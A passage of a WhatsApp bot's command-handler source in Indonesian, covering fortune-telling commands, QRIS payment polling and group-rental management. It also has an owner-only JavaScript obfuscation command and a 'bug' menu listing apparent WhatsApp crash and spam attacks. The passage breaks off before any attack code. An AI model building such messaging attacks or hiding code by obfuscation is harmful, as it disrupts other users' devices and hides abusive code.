reply(`• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'harinaas': case 'harisial': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Contoh : ${XyrooRynzz} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Hari Naas :* ${anu.message.hari_naas}\n• *Info :* ${anu.message.catatan}\n• *Catatan :* ${anu.message.info}`)
}
break
case 'nagahari': case 'harinaga': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Contoh : ${XyrooRynzz} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'arahrejeki': case 'arahrezeki': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Contoh : ${XyrooRynzz} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Rezeki :* ${anu.message.arah_rejeki}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'peruntungan': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Contoh : ${XyrooRynzz} DIka, 7, 7, 2005, 2022\n\nNote : ${XyrooRynzz} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`)
let [nama, tgl, bln, thn, untuk] = text.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'weton': case 'wetonjawa': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Contoh : ${XyrooRynzz} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Tanggal :* ${anu.message.tanggal}\n• *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n• *Watak Hari :* ${anu.message.watak_hari}\n• *Naga Hari :* ${anu.message.naga_hari}\n• *Jam Baik :* ${anu.message.jam_baik}\n• *Watak Kelahiran :* ${anu.message.watak_kelahiran}`)
}
break
case 'sifat': case 'karakter': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Contoh : ${XyrooRynzz} Dika, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Garis Hidup :* ${anu.message.garis_hidup}`)
}
break
case 'keberuntungan': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Contoh : ${XyrooRynzz} Dika, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}`)
}
break
case 'memancing': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Contoh : ${XyrooRynzz} 12, 1, 2022`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Tanggal :* ${anu.message.tgl_memancing}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'masasubur': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Contoh : ${XyrooRynzz} 12, 1, 2022, 28\n\nNote : ${XyrooRynzz} hari pertama menstruasi, siklus`)
let [tgl, bln, thn, siklus] = text.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return reply(anu.message)
reply(`• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'zodiak': case 'zodiac': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Contoh : ${XyrooRynzz} 7 7 2005`)
let zodiak = [
["capricorn", new Date(1970, 0, 1)],
["aquarius", new Date(1970, 0, 20)],
["pisces", new Date(1970, 1, 19)],
["aries", new Date(1970, 2, 21)],
["taurus", new Date(1970, 3, 21)],
["gemini", new Date(1970, 4, 21)],
["cancer", new Date(1970, 5, 22)],
["leo", new Date(1970, 6, 23)],
["virgo", new Date(1970, 7, 23)],
["libra", new Date(1970, 8, 23)],
["scorpio", new Date(1970, 9, 23)],
["sagittarius", new Date(1970, 10, 22)],
["capricorn", new Date(1970, 11, 22)]
].reverse()

function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
let date = new Date(text)
if (date == 'Invalid Date') return date
let d = new Date()
let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

let zodiac = await getZodiac(birth[1], birth[2])

let anu = await primbon.zodiak(zodiac)
if (anu.status == false) return reply(anu.message)
reply(`• *Zodiak :* ${anu.message.zodiak}\n• *Nomor :* ${anu.message.nomor_keberuntungan}\n• *Aroma :* ${anu.message.aroma_keberuntungan}\n• *Planet :* ${anu.message.planet_yang_mengitari}\n• *Bunga :* ${anu.message.bunga_keberuntungan}\n• *Warna :* ${anu.message.warna_keberuntungan}\n• *Batu :* ${anu.message.batu_keberuntungan}\n• *Elemen :* ${anu.message.elemen_keberuntungan}\n• *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'shio': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Contoh : ${XyrooRynzz} tikus\n\nNote : For Detail https://primbon.com/shio.htm`)
let anu = await primbon.shio(text)
if (anu.status == false) return reply(anu.message)
reply(`• *Hasil :* ${anu.message}`)
}
break

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Primbon Features End
//📈————————————————————————— [ Batas Fitur Sayangg ] —————————————————————————📉\\


//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Gateway Features
//📈————————————————————————— [ Features ↓↓ ] —————————————————————————📉\\
case 'buyprem': {
  if (!args[0]) return reply(`Masukkan durasi premium!\nContoh: *${prefix}buyprem 7d*`);

  const durasi = args[0].toLowerCase();
  const waktuMap = {
    '1d': { ms: 86400000, harga: 3000 },
    '3d': { ms: 86400000 * 3, harga: 7000 },
    '7d': { ms: 86400000 * 7, harga: 10000 },
    '1w': { ms: 86400000 * 7, harga: 10000 },
    '1m': { ms: 86400000 * 30, harga: 20000 },
    '1y': { ms: 86400000 * 365, harga: 100000 }
  };

  if (!waktuMap[durasi]) return reply('Durasi tidak valid!\nContoh: 1d, 3d, 7d, 1m, 1y');

  const fs = require('fs');
  const transPath = './AliceDatabase/transaksi.json';
  let requestAmount = waktuMap[durasi].harga;
  let feeServer = Math.floor(Math.random() * 11);
  let nominal = requestAmount + feeServer;

  try {
    const pay = await createQRIS(nominal, `${orkut.codeqr}`);
    const expirationTime = new Date(pay.expirationTime);
    const timeLeft = Math.floor((expirationTime - new Date()) / 60000);
    const currentTime = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
    const expireTimeJakarta = new Date(currentTime.getTime() + timeLeft * 60000);
    const formattedTime = `${expireTimeJakarta.getHours().toString().padStart(2, '0')}:${expireTimeJakarta.getMinutes().toString().padStart(2, '0')}`;

    const paymentInfo = `*PEMBAYARAN PREMIUM*\n\nMetode: QRIS\nReferensi: #${pay.transactionId}\nBerlaku: ${timeLeft} menit (${formattedTime})\nDurasi: *${durasi}*\nBiaya: ${formatmoney(requestAmount)}\nFee: ${formatmoney(feeServer)}\nTotal: ${formatmoney(nominal)}\n\nSilakan ketik .status untuk melihat status pembayaran\njika ingin membatalkan, silahkan ketikb.cancel.`;
    const qrisMsg = await Alice.sendMessage(m.chat, { image: { url: pay.qrImageUrl }, caption: paymentInfo }, { quoted: m });

    let trans = fs.existsSync(transPath) ? JSON.parse(fs.readFileSync(transPath)) : {};
    trans[m.sender] = {
      id: pay.transactionId,
      jenis: 'buyprem',
      harga: nominal,
      durasi,
      key: qrisMsg.key
    };
    fs.writeFileSync(transPath, JSON.stringify(trans, null, 2));

    let done = false;
    while (!done) {
      const res = await checkStatus(`${orkut.merchant}`, `${orkut.key}`);
      if (res && parseInt(res.amount) === nominal) {
        done = true;
        if (qrisMsg.key) await Alice.sendMessage(m.chat, { delete: qrisMsg.key });

        const premPath = './AliceDatabase/premium.json';
        let db = fs.existsSync(premPath) ? JSON.parse(fs.readFileSync(premPath)) : {};
        const now = Date.now(), selesai = now + waktuMap[durasi].ms;

        db[m.sender] = { expired: selesai, duration: durasi };
        fs.writeFileSync(premPath, JSON.stringify(db, null, 2));
        delete trans[m.sender];
        fs.writeFileSync(transPath, JSON.stringify(trans, null, 2));

        reply(`🎉 Premium aktif hingga *${new Date(selesai).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}*`);
      }
      if (!done) await new Promise(r => setTimeout(r, 10000));
    }
  } catch (err) {
    console.error('QRIS error:', err);
    reply('❌ Gagal membuat atau memproses QRIS.');
  }
}
break;

case 'buysewa': {
  if (!args[0] || !args[1]) {
    return reply(`❌ Contoh penggunaan:\n${prefix}buysewa <linkgroup> <durasi>\nContoh:\n${prefix}buysewa https://chat.whatsapp.com/xxxx 1w`);
  }

  const link = args[0];
  const durasi = args[1].toLowerCase();
  const durasiMap = {
    '1d': { ms: 86400000, harga: 5000 },
    '3d': { ms: 86400000 * 3, harga: 10000 },
    '1w': { ms: 86400000 * 7, harga: 15000 },
    '1m': { ms: 86400000 * 30, harga: 25000 },
    '1y': { ms: 86400000 * 365, harga: 100000 }
  };

  if (!durasiMap[durasi]) return reply(`❌ Durasi tidak valid.\nGunakan: 1d, 3d, 1w, 1m, 1y`);

  const fs = require('fs');
  const transPath = './AliceDatabase/transaksi.json';
  let requestAmount = durasiMap[durasi].harga;
  let feeServer = Math.floor(Math.random() * 11);
  let nominal = requestAmount + feeServer;

  try {
    const pay = await createQRIS(nominal, `${orkut.codeqr}`);
    const expirationTime = new Date(pay.expirationTime);
    const timeLeft = Math.floor((expirationTime - new Date()) / 60000);
    const currentTime = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
    const expireTimeJakarta = new Date(currentTime.getTime() + timeLeft * 60000);
    const formattedTime = `${expireTimeJakarta.getHours().toString().padStart(2, '0')}:${expireTimeJakarta.getMinutes().toString().padStart(2, '0')}`;

    const paymentInfo = `*PEMBAYARAN SEWA BOT*\n\nMetode: QRIS\nReferensi: #${pay.transactionId}\nBerlaku: ${timeLeft} menit (${formattedTime})\nDurasi: *${durasi}*\nBiaya: ${formatmoney(requestAmount)}\nFee: ${formatmoney(feeServer)}\nTotal: ${formatmoney(nominal)}\n\nSilakan ketik .status untuk melihat status pembayaran\njika ingin membatalkan, silahkan ketikb.cancel.`;
    const qrisMsg = await Alice.sendMessage(m.chat, { image: { url: pay.qrImageUrl }, caption: paymentInfo }, { quoted: m });

    let trans = fs.existsSync(transPath) ? JSON.parse(fs.readFileSync(transPath)) : {};
    trans[m.sender] = {
      id: pay.transactionId,
      jenis: 'buysewa',
      harga: nominal,
      durasi,
      link,
      key: qrisMsg.key
    };
    fs.writeFileSync(transPath, JSON.stringify(trans, null, 2));

    let done = false;
    while (!done) {
      const res = await checkStatus(`${orkut.merchant}`, `${orkut.key}`);
      if (res && parseInt(res.amount) === nominal) {
        done = true;
        if (qrisMsg.key) await Alice.sendMessage(m.chat, { delete: qrisMsg.key });

           const code = link.match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/)?.[1];
           if (!code) return reply('❌ Link grup tidak valid.');
        await Alice.groupAcceptInvite(code).then(async (res) => {
          reply('✅ Bot berhasil gabung.');

          const sewaPath = './AliceDatabase/sewa.json';
          let db = fs.existsSync(sewaPath) ? JSON.parse(fs.readFileSync(sewaPath)) : {};
          const now = Date.now(), selesai = now + durasiMap[durasi].ms;

          db[res.id] = {
            link, durasi, mulai: now, berakhir: selesai, addedBy: m.sender
          };
          fs.writeFileSync(sewaPath, JSON.stringify(db, null, 2));
          delete trans[m.sender];
          fs.writeFileSync(transPath, JSON.stringify(trans, null, 2));
        }).catch(() => reply('❌ Gagal gabung. Link salah atau bot tidak diizinkan.'));
      }
      if (!done) await new Promise(r => setTimeout(r, 10000));
    }
  } catch (err) {
    console.error('QRIS error:', err);
    reply('❌ Gagal membuat atau memproses QRIS.');
  }
}
break;

case 'cancel': {
  const fs = require('fs');
  const path = './AliceDatabase/transaksi.json';
  if (!fs.existsSync(path)) return reply('❌ Tidak ada transaksi.');

  let data = JSON.parse(fs.readFileSync(path));
  const trx = data[m.sender];
  if (!trx) return reply('❌ Tidak ada transaksi aktif.');

  // Coba hapus QRIS jika ada key
  try {
    if (trx.key) {
      await Alice.sendMessage(trx.key.remoteJid, {
        delete: {
          remoteJid: trx.key.remoteJid,
          fromMe: trx.key.fromMe,
          id: trx.key.id,
          participant: trx.key.participant || botNumber
        }
      });
    }
  } catch (err) {
    console.log('❌ Gagal hapus QRIS:', err.message);
  }

  delete data[m.sender];
  fs.writeFileSync(path, JSON.stringify(data, null, 2));
  reply(`🚫 Transaksi *${trx.jenis}* sebesar *${formatmoney(trx.harga)}* telah dibatalkan.`);
}
break;

case 'status': {
  const fs = require('fs')
  const transPath = './AliceDatabase/transaksi.json'
  if (!fs.existsSync(transPath)) return reply('📂 Tidak ada transaksi aktif saat ini.')

  let transaksi = JSON.parse(fs.readFileSync(transPath))
  let data = transaksi[m.sender]

  if (!data) return reply('🚫 Kamu tidak memiliki transaksi aktif.')

  let info = `📋 *STATUS TRANSAKSI*\n\n`
  info += `📌 Jenis: *${data.jenis === 'buyprem' ? 'Premium' : 'Sewa Grup'}*\n`
  info += `🧾 Nominal: ${formatmoney(data.harga)}\n`
  info += `🕐 Durasi: *${data.durasi || '-'}*\n`
  if (data.link) info += `🔗 Link Grup: ${data.link}\n`
  info += `🔖 Ref ID: #${data.id}\n\n`
  info += `⏳ Status: *Menunggu pembayaran...*\n\n`
  info += `❗Ketik *.cancel* untuk membatalkan transaksi.`

  reply(info)
}
break
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Gateway Features End
//📈————————————————————————— [ Batas Fitur Sayangg ] —————————————————————————📉\\


//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Owner Features
//📈————————————————————————— [ Features ↓↓ ] —————————————————————————📉\\
case 'addsewa': {
  if (!isOwner) return XRO();

  const fs = require('fs');
  const sewaPath = './AliceDatabase/sewa.json';
  const premPath = './AliceDatabase/premium.json';
  if (!fs.existsSync(sewaPath)) fs.writeFileSync(sewaPath, '{}');
  if (!fs.existsSync(premPath)) fs.writeFileSync(premPath, '[]');

  let sewa = JSON.parse(fs.readFileSync(sewaPath));
  let premium = JSON.parse(fs.readFileSync(premPath));

  const [linkgc, nomor, durasi] = args;

  if (!linkgc || !nomor) {
    return reply(`📌 Contoh:\n${XyrooRynzz} < linkgc > < nomor penyewa > < waktu >`);
  }

  if (!linkgc.includes('https://chat.whatsapp.com/')) {
    return reply(`❌ Link grup tidak valid!`);
  }

  const code = linkgc.split('https://chat.whatsapp.com/')[1];
  if (!code) return reply('❌ Link grup tidak valid.');

  let metadata;
  try {
    // Gunakan groupGetInviteInfo agar tidak join jika sudah di grup
    metadata = await Alice.groupGetInviteInfo(code);
  } catch (e) {
    return reply('❌ Gagal mendapatkan info grup. Mungkin link salah atau bot tidak punya izin.');
  }

  const groupId = metadata.id;
  const groupName = metadata.subject;
  const penyewa = nomor.replace(/[^0-9]/g, '');

  function parseDurasi(t) {
    if (t === '0' || t === 'permanent') return 0;
    const match = t.match(/^(\d+)(d|w|mo|y)$/);
    if (!match) return null;
    const val = parseInt(match[1]);
    const unit = match[2];
    const now = Math.floor(Date.now() / 1000);
    let sec = 0;
    switch (unit) {
      case 'd': sec = val * 86400; break;
      case 'w': sec = val * 604800; break;
      case 'mo': sec = val * 2592000; break;
      case 'y': sec = val * 31536000; break;
      default: return null;
    }
    return now + sec;
  }

  const expired = durasi ? parseDurasi(durasi) : 0;
  if (durasi && expired === null) {
    return reply(`❌ Format durasi tidak valid.\nGunakan: 3d (hari), 1w (minggu), 1mo (bulan), 1y (tahun), atau 0 (permanent)`);
  }

  // Simpan sewa
  sewa[groupId] = {
    expired,
    name: groupName,
    addedBy: penyewa
  };
  fs.writeFileSync(sewaPath, JSON.stringify(sewa, null, 2));

  // Tambahkan user ke premium
  const existingPrem = premium.find(v => v.id === penyewa);
  if (!existingPrem) {
    premium.push({ id: penyewa, expired: 0 });
    fs.writeFileSync(premPath, JSON.stringify(premium, null, 2));
  }

  reply(`✅ Bot berhasil masuk ke grup *${groupName}*\n📅 Masa sewa: ${expired === 0 ? 'Permanent' : new Date(expired * 1000).toLocaleString('id-ID')}\n👤 Penyewa: @${penyewa}`, {
    mentions: [penyewa + '@s.whatsapp.net']
  });

  // Coba join jika belum di grup
  try {
    await Alice.groupAcceptInvite(code);
    await Alice.sendMessage(groupId, {
      text: `🤖 Bot ini telah disewa oleh @${penyewa}\n📅 Masa sewa: ${expired === 0 ? 'Permanent' : new Date(expired * 1000).toLocaleString('id-ID')}`,
      mentions: [penyewa + '@s.whatsapp.net']
    });
  } catch (err) {
    console.log('[ADDSEWA] Tidak perlu join ulang / gagal join:', err.message);
  }
}
break;
case 'listsewa': {
  const fs = require('fs');
  const sewaPath = './AliceDatabase/sewa.json';
  if (!fs.existsSync(sewaPath)) fs.writeFileSync(sewaPath, '{}');
  const sewa = JSON.parse(fs.readFileSync(sewaPath));
  const now = Math.floor(Date.now() / 1000);
  if (Object.keys(sewa).length === 0) return reply('📭 Tidak ada grup yang menyewa bot.');

  let teks = `📦 *Daftar Sewa Bot:*\n\n`;
  for (let id in sewa) {
    const data = sewa[id];
    const exp = data.expired === 0 ? '♾️ Permanent' : (data.expired < now ? '❌ Expired' : new Date(data.expired * 1000).toLocaleString('id-ID'));
    teks += `🏷️ ${data.name}\n📍 ID: ${id}\n⏳ Exp: ${exp}\n👤 By: wa.me/${data.addedBy}\n\n`;
  }

  reply(teks);
}
break;

case 'delsewa': {
  if (!isOwner) return XRO();   // hanya owner global

  const fs  = require('fs');
  const sewaPath = './AliceDatabase/sewa.json';
  if (!fs.existsSync(sewaPath)) fs.writeFileSync(sewaPath, '{}');
  const sewa = JSON.parse(fs.readFileSync(sewaPath));

  // ── validasi argumen ─────────────────────────────
  const [linkgc, nomorArg] = args;
  if (!linkgc || !nomorArg)
    return reply(`📌 Contoh:\n${XyrooRynzz} https://chat.whatsapp.com/ABCDabcd 628xxxx`);

  if (!linkgc.includes('chat.whatsapp.com'))
    return reply('❌ Link group tidak valid!');

  const nomor = nomorArg.replace(/[^0-9]/g, '');
  const inviteCode = linkgc.split('https://chat.whatsapp.com/')[1];

  // ── ambil ID grup dari link ──────────────────────
  let metadata;
  try {
    // tidak akan join kalau bot sudah ada di grup
    metadata = await Alice.groupGetInviteInfo(inviteCode);
  } catch (e) {
    return reply('❌ Gagal mengambil info grup. Pastikan link benar.');
  }
  const groupId = metadata.id;

  // ── cek apakah grup terdaftar sebagai sewa ───────
  if (!sewa[groupId])
    return reply('❌ Grup tersebut tidak ada di daftar sewa.');

  // ── validasi penyewa (optional tapi direquest) ──
  if (sewa[groupId].addedBy !== nomor)
    return reply('⚠️ Nomor penyewa tidak cocok dengan data sewa!');

  // ── hapus data sewa & simpan ─────────────────────
  delete sewa[groupId];
  fs.writeFileSync(sewaPath, JSON.stringify(sewa, null, 2));

  // ── notif ke owner yang mem-command ──────────────
  reply(`✅ Sewa bot untuk grup *${metadata.subject}* telah dihentikan.`);

  // ── coba keluar dari grup jika bot masih di dalam ─
  try {
    await Alice.sendMessage(groupId, { text: '👋 Masa sewa bot telah dihentikan. Bot akan keluar dari grup.' });
    await Alice.groupLeave(groupId);
  } catch (err) {
    // kalau bot memang belum join / bukan admin, abaikan
    console.log('[DELSEWA] Tidak bisa keluar dari grup:', err);
  }
}
break;
case 'ceksewa': {
  const fs = require('fs');
  const sewaPath = './AliceDatabase/sewa.json';
  if (!fs.existsSync(sewaPath)) fs.writeFileSync(sewaPath, '{}');
  const sewa = JSON.parse(fs.readFileSync(sewaPath));

  if (!m.isGroup) return reply('❌ Command ini hanya bisa digunakan dalam grup.');

  const now = Math.floor(Date.now() / 1000);
  const data = sewa[m.chat];

  if (!data) return reply('❌ Grup ini tidak memiliki status sewa.');

  let status = '';
  if (data.expired === 0) {
    status = '♾️ Permanent';
  } else if (data.expired < now) {
    status = `❌ Expired pada ${new Date(data.expired * 1000).toLocaleString('id-ID')}`;
  } else {
    const expDate = new Date(data.expired * 1000).toLocaleString('id-ID');
    const sisa = data.expired - now;
    const sisaHari = Math.floor(sisa / 86400);
    const sisaJam = Math.floor((sisa % 86400) / 3600);
    const sisaMenit = Math.floor((sisa % 3600) / 60);
    status = `📅 Aktif sampai: ${expDate}\n⏳ Sisa: ${sisaHari} hari, ${sisaJam} jam, ${sisaMenit} menit`;
  }

  reply(`📦 *Status Sewa Grup Ini:*\n\n🏷️ Nama Grup: ${data.name}\n👤 Penyewa: wa.me/${data.addedBy}\n${status}`);
}
break;
	case 'addscrape':
	case 'as':
	  if (!isOwner) return XRO()
    if (!text) return reply(`• *Example :* ${XyrooRynzz} name`)
     if (!m.quoted) return reply(`🚩 reply Code Message!`)
     const quotedText = m.quoted.text || m.quoted.caption || JSON.stringify(m.quoted, null, 2)
     fs.writeFileSync(Xscraper, quotedText)
     reply(`*Berhasil disimpan di ${Xscraper}*`)
     break
  case 'dellscrape':
  case 'ds': 
    if (!isOwner) return XRO()
  if (!text) return reply(`• *Example :* ${XyrooRynzz} name`)
  if (!fs.existsSync(Xscraper)) return reply(`*[❗] File tersebut tidak ada*\n ${listScraper}`)
 await fs.unlinkSync(Xscraper)
 reply(`${Xscraper} Berhasil dihapus`)
 break
 case 'getscrape':
 case 'gs':
   if (!isOwner) return XRO()
  if (!text) return reply(`• *Example :* ${XyrooRynzz} name`)
  if (!fs.existsSync(Xscraper)) return reply(`*[❗] File tersebut tidak ada*\n ${listScraper}`)
  let teksXyroo = fs.readFileSync(Xscraper, 'utf-8')
 Alice.sendMessage(m.chat, {
text: teksXyroo,
contextInfo: {
externalAdreply: {
title: "Get Code Scrape",
body: author,
thumbnailUrl: thumb,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
break
case 'enchard': {
  if (!isOwner) return XRO()
    if (!m.quoted) return reply("reply file .js");
    if (mime !== "application/javascript") return reply("reply file .js");
    let a = await m.quoted.download(),
        b = m.quoted.fileName;
    await fs.writeFileSync(`./@hardenc${b}.js`, a);
    await reply("Memproses encrypt hard code . . .");
    await JsConfuser.obfuscate(await fs.readFileSync(`./@hardenc${b}.js`).toString(), {
        target: "node",
        preset: "high",
        compact: true,
        minify: true,
        flatten: true,
        identifierGenerator: function () {
            const c = "素晴座素晴難XyrooRynzz素晴座素晴難" + "素晴座素晴難XyrooRynzz素晴座素晴難",
                d = x => x.replace(/[^a-zA-Z座Xyroo素Rynzz素晴]/g, ''),
                e = y => [...Array(y)].map(() => "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(Math.random() * 52 | 0)).join('');
            return d(c) + e(2);
        },
        renameVariables: true,
        renameGlobals: true,
        stringEncoding: true,
        stringSplitting: 0,
        stringConcealing: true,
        stringCompression: true,
        duplicateLiteralsRemoval: 1,
        shuffle: { hash: 0, true: 0 },
      // stack: false,
        controlFlowFlattening: 1,
        opaquePredicates: 0.9,
        deadCode: 0,
        dispatcher: true,
        rgf: false,
        calculator: true,
        hexadecimalNumbers: true,
        movedDeclarations: true,
        objectExtraction: true,
        globalConcealing: true
    }).then(async f => {
        await fs.writeFileSync(`./@hardenc${b}.js`, f);
        await Alice.sendMessage(
            m.chat,
            { document: fs.readFileSync(`./@hardenc${b}.js`), mimetype: "application/javascript", fileName: b, caption: "don" },
            { quoted: m }
        );
    }).catch(g => reply("Error :" + g));
}
break;
case 'setppbot' :
case 'setpppanjang' : {
if(!isOwner) return XRO()
    let q = m.quoted ? m.quoted : m
	let mime = (q.msg || q).mimetype || q.mediaType || ''
	if ((/image/g.test(mime) && !/webp/g.test(mime))) {

async function pepe(media) {
	const jimp = await jimp_1.read(media)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp_1.MIME_JPEG),
		preview: await cropped.normalize().getBufferAsync(jimp_1.MIME_JPEG)
	}
}

		try {
			let media = await q.download()
			let { img } = await pepe(media)
			await Alice.query({
				tag: 'iq',
				attrs: {
					target: undefined,
					to: S_WHATSAPP_NET,
					type:'set',
					xmlns: 'w:profile:picture'
				},
				content: [
					{
						tag: 'picture',
						attrs: { type: 'image' },
						content: img
					}
				]
			})
			reply(`\nsukses mengganti PP bot\n`)
		} catch (e) {
			console.log(e)
		}
	} else {
		reply(`\nkirim gambar dengan caption *${XyrooRynzz}* atau reply gambar yang sudah dikirim\n`)
	}
}
break
case 'setting':
case 'setbot': 
case 'alice': 
case 'bot':{
if(!isOwner) return XRO()
const caption = `Silahkan Dipilih Tuan`;
let sections = [
{
highlight_label: 'Alice Self',
rows: [{
title: 'Nyalakan self',
id: `${Xyroo}self`
}]
},
{
highlight_label: 'Alice Public',
rows: [{
title: 'Matikan Self',
id: `${Xyroo}public`
}]
},
{
highlight_label: 'Alice Onlygroup',
rows: [{
title: 'Nyalakan Onlygroup',
id: `${Xyroo}onlygc on`
}]
},
{
highlight_label: 'Alice Onlygroup',
rows: [{
title: 'Matikan Onlygroup',
id: `${Xyroo}onlygc off`
}]
},
{
highlight_label: 'Alice Anticall',
rows: [{
title: 'Nyalakan Anticall',
id: `${Xyroo}anticall on`
}]
},
{
highlight_label: 'Alice Anticall',
rows: [{
title: 'Matikan Anticall',
id: `${Xyroo}anticall off`
}]
},
{
highlight_label: 'Alice Autobio',
rows: [{
title: 'Nyalakan Autobio',
id: `${Xyroo}autobio on`
}]
},
{
highlight_label: 'Alice Autobio',
rows: [{
title: 'Matikan Autobio',
id: `${Xyroo}autobio off`
}]
},
{
highlight_label: 'Alice Autoread',
rows: [{
title: 'Nyalakan Autoread',
id: `${Xyroo}autoread on`
}]
},
{
highlight_label: 'Alice Autoread',
rows: [{
title: 'Matikan Autoread',
id: `${Xyroo}autoread off`
}]
},
{
highlight_label: 'Alice Setprefix',
rows: [{
title: 'Setprefix',
id: `${Xyroo}aliceprefix`
}]
}]

let listMessage = {
    title: `Setting ${botname}`, 
    sections
}


let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterName: author,
 newsletterJid: idch,
 serverMessageId: 143
},
 businessMessageForwardInfo: { businessOwnerJid: Alice.decodeJid(Alice.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: caption
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: packname
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `Haii developer, mau set apa di aku?`,
 subtitle: "",
 hasMediaAttachment: true,
 ...(await prepareWAMessageMedia({ image: { url: thumb } }, { upload: Alice.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
 }
 ],
 })
 })
 }
 }
}, {})

if (!text) await Alice.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
break 

case 'xbug':
case 'bug': {
if(!isOwner) return XRO()
const caption = `Silahkan Dipilih Tuan`;
let sections = [
{
highlight_label: 'X Spammer',
rows: [{
title: 'Buh Spam Delay',
id: `${Xyroo}x-spam`
}]
},
{
highlight_label: 'Hama Delay',
rows: [{
title: 'Bug Hama Delay',
id: `${Xyroo}x-hama`
}]
},
{
highlight_label: 'Maker Fc',
rows: [{
title: 'Bug Maker Delay',
id: `${Xyroo}x-maker`
}]
},
{
highlight_label: 'Vision Bug',
rows: [{
title: 'Bug Vision Delay',
id: `${Xyroo}x-vision`
}]
},
{
highlight_label: 'Vixiv Debugger',
rows: [{
title: 'Bug Vixiv Delay',
id: `${Xyroo}x-vixiv`
}]
}]

let listMessage = {
